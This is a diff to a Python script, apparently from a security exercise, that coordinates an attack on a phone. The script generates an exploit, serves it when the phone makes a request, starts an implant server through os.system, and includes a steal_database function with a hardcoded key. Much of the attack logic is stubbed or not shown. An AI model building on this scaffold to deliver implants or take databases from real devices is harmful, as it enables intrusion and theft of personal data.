@@ -2,6 +2,7 @@ import http.server, socket, sqlite3, json, requests, datetime, os
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from Crypto.Cipher import AES
 import gen_exploit
+import os
 
 # uses port 12345, ensure later processes use a different port
 # TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
@@ -14,22 +15,9 @@ def listen_for_phone_and_send_exploit_file():
 def prepare_implant():
     pass
 
-def send_implant():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    port =  8080            
-    s.bind(('', port))
-    s.listen(1)        
-    print("Listening on port "+ str(port))         
-    count = 0 
-    while count < 1:
-        conn, addr = s.accept()
-        print('Got connection from: ', addr)
-        payload = 'HaHahAHa gEt pWnEd LOLOLOL'
-        conn.send(payload.encode())
-        print("Payload sent to target")
-        count += 1
-        conn.close() 
-        print("Connection closed")
+def start_implant_server():
+    os.system("python3 implant-server.py")
+
 
 def steal_database():
     key = "546869732069732061206b6579313233"
@@ -81,6 +69,7 @@ def connect_to_db(filepath):
 if __name__ == "__main__":
     # host = 'localhost'
     gen_exploit.gen_exploit()
+    start_implant_server()
     listen_for_phone_and_send_exploit_file()
     # send_implant(host)
     # steal_database()
